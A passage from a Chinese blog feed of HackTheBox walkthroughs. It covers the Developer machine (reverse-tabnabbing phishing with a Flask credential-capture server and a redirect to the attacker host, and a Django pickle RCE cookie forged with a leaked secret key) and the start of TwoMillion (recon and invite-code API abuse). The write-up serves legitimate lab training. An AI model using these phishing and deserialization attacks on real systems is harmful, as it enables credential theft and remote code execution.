# 3. 根据推导，将三个密文全部异或
# flag = ct1 ^ ct2 ^ ct3
# 我们可以分两步来完成
temp_xor_result = bxor(ct1, ct2)
flag_bytes = bxor(temp_xor_result, ct3)

# 4. 将恢复的字节数据解码为UTF-8字符串并打印
try:
    flag = flag_bytes.decode('utf-8')
    print("🎉 Flag has been successfully recovered!")
    print(f"[*] Flag: {flag}")
except UnicodeDecodeError:
    print("❌ Could not decode the result as a UTF-8 string.")
    print(f"[*] Raw bytes (hex): {flag_bytes.hex()}")
```

```bash
🎉 Flag has been successfully recovered!
[*] Flag: DHTB{XorXorXorFunFunFun}
```

## 钓鱼攻击

其实做完一道题就可以继续打了

做完后有一个提交`writeup`的输入框

我们开启`Web`服务器，并提交改地址上去，看是否有人会访问

不一会就有回显了

```bash
➜  Developer python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.103 - - [21/Jun/2025 18:53:48] "GET / HTTP/1.1" 200 -
10.10.11.103 - - [21/Jun/2025 18:53:49] code 404, message File not found
10.10.11.103 - - [21/Jun/2025 18:53:49] "GET /favicon.ico HTTP/1.1" 404 -
```

但是我们还不知道要如何进行利用

`Sessionid`开启了`httponly` ，我们无法通过`XSS`获取

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image13.png)

通过目录扫描能发现，还存在一个登录框，并且是只能`admin`才能访问

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image14.png)

但是现在没什么用，回到后台，我发现当我们提交了`writeup`后，会在`profile`中生成一个链接

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image15.png)

重要的是这个链接具有`target`属性，其值为`_blank`,同时没有使用`rel="noopener"`属性，这让我想起`Reverse_Tabnabbing` （标签页劫持攻击）漏洞，之前有在`Vulnhub`上的一台靶机（https://www.vulnhub.com/entry/napping-101,752/）遇到过

### Reverse_Tabnabbing

> https://owasp.org/www-community/attacks/Reverse_Tabnabbing
> 

监听一下对方请求

```bash
➜  Developer nc -lvp 80    
listening on [any] 80 ...
connect to [10.10.16.58] from developer.htb [10.10.11.103] 47222
GET / HTTP/1.1
Host: 10.10.16.58
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sat, 21 Jun 2025 11:08:45 GMT
```

回显中有`firefox`的`UA`，很大概率使用浏览器来访问的

现在的思路是：提交跳转链接，然后伪造一个和`developer.htb` 的登录页面一样站点，对方点击后，弹到`writeup`页面，然后原始页面（`dashbroad`）变成我们的钓鱼网站，让对方以为登录掉了，然后我们获取凭证

这里借用：https://0xdf.gitlab.io/2022/01/15/htb-developer.html#shell-as-www-data 的方法，我自己弄了好久没弄好

搭建钓鱼服务器

```bash
➜  Developer cat server2.py  
from flask import *

app = Flask(__name__, template_folder='.')

@app.route("/writeup")
def writeup():
    return render_template('writeup.html')

@app.route("/accounts/login/", methods=['GET', 'POST'])
def login():

    if request.method == 'POST':
        print('\n'.join([f'{x[0]}: {x[1]}' for x in request.form.items()]))
        return redirect("http://10.10.10.120/accounts/login/", code=302)
    else:
        return render_template('login.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

跳转网站

```bash
<html>
  <body>
    <h2>Challenge Writeup</h2>
    <p>Something</p>
    <script>
    if (window.opener) window.opener.parent.location.replace('http://10.10.16.58/accounts/login/');
    if (window.parent != window) window.parent.location.replace('https://10.10.16.58/accounts/login/');           
    </script>
  </body>
</html>
```

制造钓鱼站点

```bash
➜  Developer curl http://developer.htb/accounts/login/ > login.html                                                
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1938  100  1938    0     0  13686      0 --:--:-- --:--:-- --:--:-- 13744
```

修改里面的静态内容为绝对路径并将`action` 改为`/accounts/login/`

```bash
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="http://developer.htb/img/favicon.ico">
    <link rel="stylesheet" href="http://developer.htb/static/css/jquery.toasts.css">
    <script src="http://developer.htb/static/js/all.min.js"></script>
    <script src="http://developer.htb/static/js/jquery-3.2.1.min.js"></script>
    <title>Login | Developer.HTB</title>

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="http://developer.htb/static/css/bootstrap.min.css">

    <!-- Custom styles for this template -->
    <link href="http://developer.htb/static/css/signin.css" rel="stylesheet">
  </head>

  <body class="text-center">

    <form class="form-signin" action="/accounts/login/" method="post">
        <input type="hidden" name="csrfmiddlewaretoken" value="3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE">
      <img class="mb-4" src="http://developer.htb/static/img/logo.png" alt="" width="72" height="72">
      <h1 class="h3 mb-3 font-weight-normal">Welcome back!</h1>
      <label for="uname" class="sr-only">User Name</label>
      <input type="text" id="id_login" name="login" placeholder="Username" class="form-control" required autofocus>
      <label for="password" class="sr-only">Password</label>
      <input type="password" id="id_password" name="password" placeholder="Password" class="form-control" required>

      <button id="loginbtn" class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
          <a href="http://developer.htb/saccounts/password/reset/" class="auth-link">Forgot password?</a>
                <div class="text-center mt-4 font-weight-light"> Don't have an account? <a href="http://developer.htb/saccounts/signup/" >Click here!</a>
      <p class="mt-5 mb-3 text-muted">&copy; Developer.HTB 2021</p>
    </form>

<script src="http://developer.htb/static/js/jquery.toast.js"></script>
<script>

</script>
  </body>
</html>
```

开启钓鱼服务器，并提交`/writeup`到站点中，过一会就能接收到用户的密码了

```bash
➜  Developer python server2.py
 * Serving Flask app 'server2'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.111.155:80
Press CTRL+C to quit
10.10.11.103 - - [21/Jun/2025 20:49:24] "GET /writeup HTTP/1.1" 200 -
10.10.11.103 - - [21/Jun/2025 20:49:24] "GET /accounts/login/ HTTP/1.1" 200 -
csrfmiddlewaretoken: 3W4vCYZiDT8dEraVzrXiGZWKWIOnF1L89n59maXHD5msDXNkDs2N5ZV6TmEIQqFE
login: admin
password: SuperSecurePassword@HTB2021
10.10.11.103 - - [21/Jun/2025 20:49:25] "POST /accounts/login/ HTTP/1.1" 302 -
10.10.11.103 - - [21/Jun/2025 20:49:28] "GET /accounts/login/ HTTP/1.1" 200 -
```

这里很奇怪的就是，我自己复现该漏洞无法复现成功

## Django Secret Key & RCE

拥有管理员凭据后，我们就能对 `/admin`进行登陆了

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image16.png)

能发现一个新的子域名

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image17.png)

搭建的是`sentry` 一款开源的实时异常监控平台

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image18.png)

注册账号登录进去，无法使用上面的凭据

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image19.png)

版本 `Sentry 8.0.0` 在网上能找到它的反序列化漏洞的利用脚本，但是并没有将`shell`弹回来

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image20.png)

这里使用 `jacob@developer.htb` （可以从`Member`里得到）的凭据和上边钓鱼得到的密码成功获得`sentry`更高权限

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image21.png)

然后摸索一番后，我创建了新的`project`然后删除，但是删除的时候出现了错误

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image22.png)

还有很多的调试信息

```bash
SENTRY_OPTIONS 	

{'cache.backend': 'sentry.cache.redis.RedisCache',
 'cache.options': {},
 'redis.options': {'hosts': {0: {'host': '127.0.0.1',
                                 'password': 'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe',
                                 'port': 6379}}},
 'system.databases': {'default': {'ATOMIC_REQUESTS': False,
                                  'AUTOCOMMIT': True,
                                  'CONN_MAX_AGE': 0,
                                  'ENGINE': 'sentry.db.postgres',
                                  'HOST': 'localhost',
                                  'NAME': 'sentry',
                                  'OPTIONS': {},
                                  'PASSWORD': u'********************',
                                  'PORT': '',
                                  'TEST_CHARSET': None,
                                  'TEST_COLLATION': None,
                                  'TEST_MIRROR': None,
                                  'TEST_NAME': None,
                                  'TIME_ZONE': 'UTC',
                                  'USER': 'sentry'}},
 'system.debug': True,
 'system.secret-key': 'c7f3a64aa184b7cbb1a7cbe9cd544913'}
```

可以看到内部装了`redis` ，并且密码也出来了，下边还有个有趣的`secret-key`

经过一番搜索，`secret-key` 会导致反序列化的`RCE`漏洞

其中有一篇文章：https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/

里边有一个`POC` ，会让系统睡`30`秒

```bash
#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os

SECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'
#Initial cookie I had on sentry when trying to reset a password
cookie='.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQplR7lVRJYEmrkUFqZFcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQABCTQf:1uSyim:otT7eddw7eu0o_QNAt1QRz6f1m8'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("sleep 30",))
newContent['testcookie'] = PickleRce()

print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
```

```bash
➜  Developer python2 POC.py     
.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABCmRHuVVElgSauRQWpkVwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUI5inNSUwsUjA0KmVsLWYIKWUOF4hNLSzLiS4tTi-KTEpOzU_NSQpUgduiVlmTmFOuB5PVccxMzcxyBLCeoGl4kfZkp3qylegB0jjs_:1uT0GX:UtsjlwEnnkwtUuqifJt-ZzyYO1s
```

事实证明，替换了`Cookie`后，确实加载了`30`秒

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image23.png)

我们尝试让其`curl`我们的服务器

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image24.png)

进行反弹`Shell` 

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image25.png)

## In www-data Shell

信息收集一波

有两个用户

```bash
www-data@developer:/var/sentry$ ls /home
ls /home
karl
mark
```

数据配置文件可以在`/var/www/developer_ctf/developer_ctf/settings.py` 中找到

```bash
DATABASES = {                                            
    'default': {           
        'ENGINE': 'django.db.backends.postgresql',       
        'NAME': 'platform',             
        'USER': 'ctf_admin',  
        'PASSWORD': 'CTFOG2021',                         
        'HOST': 'localhost',   
        'PORT': '',    
    }                                      
}  
```

```bash
www-data@developer:~/developer_ctf$ psql -U ctf_admin -h localhost -p 5432 -d platform
Password for user ctf_admin: 
psql (9.6.22)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

platform=> 
```

获得用户似乎都无效

```bash
 id |                                         password                                         |          last_login           | is_superuser |                                                                        username                                                                        | first_name | last_name |          email           | is_staff | is_active |          date_joined          
----+------------------------------------------------------------------------------------------+-------------------------------+--------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+------------+-----------+--------------------------+----------+-----------+-------------------------------
  5 | pbkdf2_sha256$260000$FyKNWfAl4Z87o55I4bDST7$7PrVwU5N1687BSxClTP0tlnFg+9VmOR6lsXiJsSRBNE= | 2021-05-27 20:15:00.346686+00 | f            | clubby789                                                                                                                                              |            |           | clubby789@developer.htb  | f        | t         | 2021-05-27 20:15:00.157993+00
  2 | pbkdf2_sha256$260000$7Pu55SdoDNTu51RrtU5V8A$Fmn66ovbOqfNUKftQYrJcWmk7xzejU0g3F72jL+cdUg= | 2021-05-23 22:25:03.654845+00 | f            | willwam845                                                                                                                                             |            |           | willwam845@developer.htb | f        | t         | 2021-05-23 22:25:03.474364+00
  3 | pbkdf2_sha256$260000$k0RbpkHl5CvArYIwsGxFUb$ixe4YKYn45Fm8aq56GEzF8TUi9lydD2WA2gRxXz/EMc= | 2021-05-25 12:23:52.298531+00 | f            | dmw0ng                                                                                                                                                 |            |           | dmw0ng@developer.htb     | f        | t         | 2021-05-25 12:23:52.090526+00
  4 | pbkdf2_sha256$260000$aFEnXsRKf4YRRUw1qnlJSN$4oL+FVJpqmi4sCt4U9ddPRE1srKZiP+HCXInnCuzdv0= | 2021-05-25 13:52:30.406816+00 | f            | jazzpizazz                                                                                                                                             |            |           | jazzpizazz@developer.htb | f        | t         | 2021-05-25 13:52:30.239297+00
  8 | pbkdf2_sha256$260000$1ooBpoiFmfVEwYt6dsoXMi$fODy4UKt0vv0BllqLAJmSinmGBFffbezZrLptuyGpe4= | 2025-06-21 11:35:29.667268+00 | f            | sunset                                                                                                                                                 |            |           | sunset@qq.com            | f        | t         | 2025-06-21 04:44:05.184883+00
  9 | pbkdf2_sha256$260000$7fttI4Tuwlrd2wlnkScbDs$t9DwUfhd6jv8yiD7uih4HMgsKjrUg/uCVR3RdujzBic= |                               | f            | 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 |            |           |                          | f        | t         | 2025-06-21 13:07:47.706432+00
 10 | pbkdf2_sha256$260000$2tCPe0purzYSIKkdmorGpl$a4bFd9XH8FUfnZl+mx/uAV3E1VxcjFJUOy8UAlbxL9Y= |                               | f            | 222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222 |            |           |                          | f        | t         | 2025-06-21 13:08:43.403158+00
  1 | pbkdf2_sha256$260000$H7w2AZzBGAHHHvSzgQZXHf$TWkQdxmDHXDxoWLSEQYjZQbMJJjMpzmEHBqWMNHr0xc= | 2025-06-21 13:16:19.266228+00 | t            | admin                                                                                                                                                  | Jacob      | Taylor    | admin@developer.ctf      | t        | t         | 2021-05-22 23:14:03+00
```

然后在`/etc/sentry/sentry.conf.py` 又能找到一个数据库凭据

```bash
    'default': {
        'ENGINE': 'sentry.db.postgres',
        'NAME': 'sentry',                           
        'USER': 'sentry',
        'PASSWORD': 'SentryPassword2021',
        'HOST': 'localhost',
        'PORT': '',
    }     
}
```

这次能获得三个用户，并且`karl`是有家目录的

```bash
sentry=#   
select id,username,password from auth_user;
 id |      username       |                                   password                                    
----+---------------------+-------------------------------------------------------------------------------
  1 | karl@developer.htb  | pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=
  6 | sunset@qq.com       | pbkdf2_sha256$12000$0EZfh8zCtpXY$8aNutC5bwrU65AtpuvspwEicUw2+63EQ61zjTyzVViE=
  5 | jacob@developer.htb | pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts=
(3 rows)
```

尝试破解密码

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image26.png)

得到密码：`insaneclownposse`

成功进入`Karl`用户`Shell`中，读取`user.txt`

```bash
karl@developer:~$ cat user.txt
77cc1a399155edc9a66dae47df32a834
```

## In Karl Shell - To Root

`sudo`权限

```bash
karl@developer:~$ sudo -l
[sudo] password for karl: 
Matching Defaults entries for karl on developer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karl may run the following commands on developer:
    (ALL : ALL) /root/.auth/authenticator
```

拉出来`IDA` ，`rust` 逆向`+1`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image27.png)

`main`中还有个`authentication::main` 

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  isize v4; // rdx
  core::ops::function::_Fn<()> v5; // rdi
  __int64 (__fastcall *v7)(); // [rsp+0h] [rbp-8h] BYREF

  v4 = argc;
  v7 = authentication::main::h453271f02403abaf;
  v5.vtable = (usize (*)[3])&anon_b091e66417960b0266d335ff382118b4_0_llvm_10046553308101135558;
  v5.pointer = (u8 *)&v7;
  return std::rt::lang_start_internal::h3c710f42dc1fbba8(v5, v4, (u8 **)argv);
}
```

进入到`authentication::main` ，前边两个`print`是打印前两条信息

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image28.png)

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image29.png)

再下面就是加密的函数

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image30.png)

`args.pieces.data_ptr = (_str *)crypto::aes::ctr::h2e946f13694abc7d(0LL, &v36, 16LL, &v37, 16LL);`

告诉我们使用`AES-CTR`进行加密，并且传入了从内存地址冲传入的两个常量`v36`和`v37` ，很有可能是`key`和`VI`

我们从`v36` 和 `v37`中将值复制出来

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image31.png)

还因为是小端显示的问题，我们还要对其转换一下

```bash
D5F5F4BE3DD4209E6191795C3432E8A3
6A812006DC5598A79A95D2D9E3591F76
//
A3E832345C7991619E20D43DBEF4F5D5
761F59E3D9D2959AA79855DC0620816A
```

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image32.png)

我们将加密和解密函数准备好

再到下边（代码喂给`AI`），首先会判断明文长度是否等于`32`

```bash
if ( size[1] == 32
    && (ptr == (u8 *)v5
     || _mm_movemask_epi8(
          _mm_and_si128(
            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr + 1), _mm_loadu_si128(v5 + 1)),
            _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)ptr), _mm_loadu_si128(v5)))) == 0xFFFF) )
  {
```

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image33.png)

`ptr` (我们的解密结果) 的地址被加载到了 `RAX` 寄存器。`v5` (程序内置的目标明文) 的地址被加载到了 `R15` 寄存器。

通过调试确认一下

```bash
pwndbg> b main
pwndbg> r
pwndbg> b *0x55555555b9b9
Breakpoint 2 at 0x55555555b9b9
pwndbg> c
Continuing.
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA //因为期待解密后明文长度是32因此输入32个A
pwndbg> hexdump $rax 32 //获取RAX的值
+0000 0x5555555b7dd0  ed 2f 17 c5 87 44 a4 d8  5c a2 c9 6b d4 69 18 22  │./...D..│\..k.i."│
+0010 0x5555555b7de0  69 86 ec f4 c8 2c 84 de  d8 c1 dc 4b ec 57 6e 44  │i....,..│...K.WnD│
```

```bash
➜  Developer awk '{for(i=3;i<=18;i++) printf $i}' rax
ed2f17c58744a4d85ca2c96bd46918226986ecf4c82c84ded8c1dc4bec576e44#    
```

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image34.png)

解密成功，那么`R15`的值应该就是我们需要的

```bash
pwndbg> hexdump $r15 32
+0000 0x5555555b7c20  fe 1b 25 f0 80 6a 97 ca  78 80 fd 58 fc 5c 20 23  │..%..j..│x..X.\.#│
+0010 0x5555555b7c30  6c a2 db d0 e5 02 b5 fa  eb c0 af 3a 9f 27 15 2c  │l.......│...:.'.,│
```

```bash
➜  Developer awk '{for(i=3;i<=18;i++) printf $i}' r15
fe1b25f0806a97ca7880fd58fc5c20236ca2dbd0e502b5faebc0af3a9f27152c#   
```

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image35.png)

得到重点`RustForSecurity@Developer@2021:)`

我们到`karl`的`shell`中运行程序，会让我们输入我们的公钥

```bash
karl@developer:~$ sudo /root/.auth/authenticator 
[sudo] password for karl: 
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user: 
RustForSecurity@Developer@2021:)
You have successfully authenticated
Enter your SSH public key in now:
ssh-xxxxx AAAAC3NzxxxxxxxJqSEDwP6SCfe root@kali
You may now authenticate as root!
```

然后通过我们的私钥就可以登录到`root`

![image.png](/post-images/HackTheBoxMachine%20-%20Developer/image36.png)

读取 `root.txt`

```bash
root@developer:~# cat root.txt 
720b2e4080688fxxxxx
```

## 总结

很多的知识盲区，或者说是我没耐心，很多地方都要看一下WP才能知道如何走下去

总的来说难度个人而言 `8/10` ，泪]]></content:encoded>
            <category>靶机</category>
            <category>HackTheBox</category>
            <category>Linux</category>
            <category>CTF</category>
            <category>Rrverse</category>
            <category>Rust</category>
            <category>Django</category>
            <category>Tabanbbing</category>
            <category>Crack</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - TwoMillion]]></title>
            <link>https://www.sunsetaction.top/2025/06/21/HackTheBoxMachine - TwoMillion</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/21/HackTheBoxMachine - TwoMillion</guid>
            <pubDate>Sat, 21 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine TwoMillion https://app.hackthebox.com/machines/TwoMillion | Linux | Eas Recon 访问 HTTP 服务，采集指纹，是介绍 HackTheBox 网站 有一个登录页 注册需要拿到邀请码 通过目录扫描能扫描到另外一...]]></description>
            <content:encoded><![CDATA[
# Machine - TwoMillion

> https://app.hackthebox.com/machines/TwoMillion | `Linux` | `Eas`
> 

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image.png)

## Recon

```bash
➜  TwoMillion nmap -sT -min-rate 5000 10.10.11.221  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:22 CST
Nmap scan report for 10.10.11.221
Host is up (0.072s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
```

```bash
➜  TwoMillion nmap -sT -A -p 22,80 10.10.11.221   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 20:23 CST
Nmap scan report for 10.10.11.221
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   117.43 ms 10.10.16.1
2   71.72 ms  10.10.11.221

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.44 seconds
➜  TwoMillion ls                                  
```

访问 `HTTP` 服务，采集指纹，是介绍 `HackTheBox` 网站

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image1.png)

有一个登录页

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image2.png)

注册需要拿到邀请码

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image3.png)

通过目录扫描能扫描到另外一个注册页面，依旧是需要`Invite Code`

```bash
➜  TwoMillion dirsearch -u http://2million.htb -e txt,zip -x 403,404,503 
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: txt, zip | HTTP method: GET | Threads: 25 | Wordlist size: 9979

Output File: /root/Desktop/HackTheBox/TwoMillion/reports/http_2million.htb/_25-06-20_20-53-44.txt

Target: http://2million.htb/

[20:53:44] Starting: 
[20:53:53] 200 -    2KB - /404
[20:54:04] 401 -    0B  - /api
[20:54:04] 401 -    0B  - /api/v1
[20:54:05] 301 -  162B  - /assets  ->  http://2million.htb/assets/
[20:54:12] 301 -  162B  - /css  ->  http://2million.htb/css/
[20:54:18] 301 -  162B  - /fonts  ->  http://2million.htb/fonts/
[20:54:20] 302 -    0B  - /home  ->  /
[20:54:21] 301 -  162B  - /images  ->  http://2million.htb/images/
[20:54:23] 301 -  162B  - /js  ->  http://2million.htb/js/
[20:54:25] 200 -    4KB - /login
[20:54:26] 302 -    0B  - /logout  ->  /
[20:54:38] 200 -    4KB - /register
[20:54:52] 301 -  162B  - /views  ->  http://2million.htb/views/

Task Completed
```

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image4.png)

## GetInviteCode

我们仔细观察`invite`页面，会加载一个JS文件`inviteapi.min.js` ，是一个`Packer`一种`JavaScript`代码混淆器

```bash
eval(
  (function (p, a, c, k, e, d) {
    e = function (c) {
      return c.toString(36);
    };
    if (!''.replace(/^/, String)) {
      while (c--) {
        d[c.toString(a)] = k[c] || c.toString(a);
      }
      k = [
        function (e) {
          return d[e];
        },
      ];
      e = function () {
        return '\\w+';
      };
      c = 1;
    }
    while (c--) {
      if (k[c]) {
        p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
      }
    }
    return p;
  })(
    '1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
    24,
    24,
    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split(
      '|',
    ),
    0,
    {},
  ),
);

```

我们使用`AI`将其还原得到

```bash
function verifyInviteCode(code) {
  var formData = { "code": code };
  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: '/api/v1/invite/verify',
    success: function(response) {
      console.log(response);
    },
    error: function(response) {
      console.log(response);
    }
  });
}

function makeInviteCode() {
  $.ajax({
    type: "POST",
    dataType: "json",
    url: '/api/v1/invite/how/to/generate',
    success: function(response) {
      console.log(response);
    },
    error: function(response) {
      console.log(response);
    }
  });
}
```

其中的`/api/v1/invite/how/to/generate`很令人感兴趣

```bash
➜  TwoMillion curl http://2million.htb/api/v1/invite/how/to/generate -X POST
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}#
```

> Data is encrypted ... We should probbably check the encryption type in order to decrypt it...
> 

从`dada`能看到，加密类型是`ROT13`

```bash
"data":{
	"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr",
	"enctype":"ROT13"
}
```

通过`CyberChef`即可解密

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image5.png)

```bash
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```

让我们向`/api/v1/invite/generate` 发起`POST`请求

```bash
➜  TwoMillion curl http://2million.htb/api/v1/invite/generate  -X POST     
{"0":200,"success":1,"data":{"code":"NjlKS04tMkVHSTQtM1NIN0YtUjNLRFk=","format":"encoded"}}#  
```

可以看到还是加密的，但是这次的加密就是简单的`base64`编码

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image6.png)

得到邀请码 `69JKN-2EGI4-3SH7F-R3KDY`

我们通过邀请码注册用户 `sunset`

## 后台利用

我们从`Rules`中能知道是可以攻击其他成员的

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image7.png)

并且在 `http://2million.htb/home/access#` 中能生成`opvn`文件（经过实验是无法进行连接的），端点是**`/**api/v1/user/vpn/generate`

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image8.png)

我们可以注意到端点是**`/**api/v1/user` 那么可能会有**`/**api/v1/admin`

这里我使用`feroxbuster` 测试了很久，但是还是没有`fuzz`出来

但是这里其实只需要访问 `/api/v1`就可以得到接口路径信息…

![image.png](/post-images/HackTheBoxMachine%20-%20TwoMillion/image9.png)

```bash
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

### 接口测试

三个管理员接口中，我们对`/api/v1/admin/settings/update` 最感兴趣

```bash
